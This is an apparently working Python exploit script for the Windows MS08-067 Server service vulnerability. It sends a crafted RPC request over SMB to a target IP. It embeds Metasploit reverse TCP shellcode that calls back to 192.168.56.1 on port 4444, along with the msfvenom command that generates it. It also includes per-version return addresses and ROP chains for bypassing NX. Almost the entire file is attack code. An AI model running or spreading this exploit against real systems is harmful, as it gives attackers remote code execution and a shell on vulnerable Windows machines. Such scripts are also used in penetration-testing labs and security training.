#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : https://github.com/CoreSecurity/impacket.git'
    print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
    sys.exit(1)

print '#######################################################################'
print '#   MS08-067 Exploit'
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
print '#######################################################################\n'


# Reverse TCP shellcode from metasploit; port 4444 IP 192.168.56.1; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
# Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
# EXITFUNC=thread Important!
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c
shellcode = (
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x27\xf0\x9d\xea\x83\xee\xfc\xe2\xf4\xdb\x18\x1f\xea\x27\xf0"
"\xfd\x63\xc2\xc1\x5d\x8e\xac\xa0\xad\x61\x75\xfc\x16\xb8\x33"
"\x7b\xef\xc2\x28\x47\xd7\xcc\x16\x0f\x31\xd6\x46\x8c\x9f\xc6"
"\x07\x31\x52\xe7\x26\x37\x7f\x18\x75\xa7\x16\xb8\x37\x7b\xd7"
"\xd6\xac\xbc\x8c\x92\xc4\xb8\x9c\x3b\x76\x7b\xc4\xca\x26\x23"
"\x16\xa3\x3f\x13\xa7\xa3\xac\xc4\x16\xeb\xf1\xc1\x62\x46\xe6"
"\x3f\x90\xeb\xe0\xc8\x7d\x9f\xd1\xf3\xe0\x12\x1c\x8d\xb9\x9f"
"\xc3\xa8\x16\xb2\x03\xf1\x4e\x8c\xac\xfc\xd6\x61\x7f\xec\x9c"
"\x39\xac\xf4\x16\xeb\xf7\x79\xd9\xce\x03\xab\xc6\x8b\x7e\xaa"
"\xcc\x15\xc7\xaf\xc2\xb0\xac\xe2\x76\x67\x7a\x98\xae\xd8\x27"
"\xf0\xf5\x9d\x54\xc2\xc2\xbe\x4f\xbc\xea\xcc\x20\x0f\x48\x52"
"\xb7\xf1\x9d\xea\x0e\x34\xc9\xba\x4f\xd9\x1d\x81\x27\x0f\x48"
"\x80\x22\x98\x5d\x42\x1f\x95\xf5\xe8\x27\xe1\xc1\x63\xc1\xa0"
"\xcd\xba\x77\xb0\xcd\xaa\x77\x98\x77\xe5\xf8\x10\x62\x3f\xb0"
"\x9a\x8d\xbc\x70\x98\x04\x4f\x53\x91\x62\x3f\xa2\x30\xe9\xe0"
"\xd8\xbe\x95\x9f\xcb\x18\xfc\xea\x27\xf0\xf7\xea\x4d\xf4\xcb"
"\xbd\x4f\xf2\x44\x22\x78\x0f\x48\x69\xdf\xf0\xe3\xdc\xac\xc6"
"\xf7\xaa\x4f\xf0\x8d\xea\x27\xa6\xf7\xea\x4f\xa8\x39\xb9\xc2"
"\x0f\x48\x79\x74\x9a\x9d\xbc\x74\xa7\xf5\xe8\xfe\x38\xc2\x15"
"\xf2\x73\x65\xea\x5a\xd2\xc5\x82\x27\xb0\x9d\xea\x4d\xf0\xcd"
"\x82\x2c\xdf\x92\xda\xd8\x25\xca\x82\x52\x9e\xd0\x8b\xd8\x25"
"\xc3\xb4\xd8\xfc\xb9\x03\x56\x0f\x62\x15\x26\x33\xb4\x2c\x52"
"\x37\x5e\x51\xc7\xed\xb7\xe0\x4f\x56\x08\x57\xba\x0f\x48\xd6"
"\x21\x8c\x97\x6a\xdc\x10\xe8\xef\x9c\xb7\x8e\x98\x48\x9a\x9d"
"\xb9\xd8\x25\x9d\xea"
)

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)

        print '[-]Initiating connection'
        self.__trans = transport.DCERPCTransportFactory(
            'ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        self.__stub = server + "\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"
        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(5)
        print 'Exploit finish\n'

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = sys.argv[2]
       except IndexError:
                print '\nUsage: %s <target ip>\n' % sys.argv[0]
                print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
                print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'
                print 'Example: MS08_067.py 192.168.1.1 3 for Windows 2003 SP0 Universal\n'
                print 'Example: MS08_067.py 192.168.1.1 4 for Windows 2003 SP1 English\n'
                print 'Example: MS08_067.py 192.168.1.1 5 for Windows XP SP3 French (NX)\n'
                print 'Example: MS08_067.py 192.168.1.1 6 for Windows XP SP3 English (NX)\n'
                print 'Example: MS08_067.py 192.168.1.1 7 for Windows XP SP3 English (AlwaysOn NX)\n'
                sys.exit(-1)

current = SRVSVC_Exploit(target, os)
current.start()





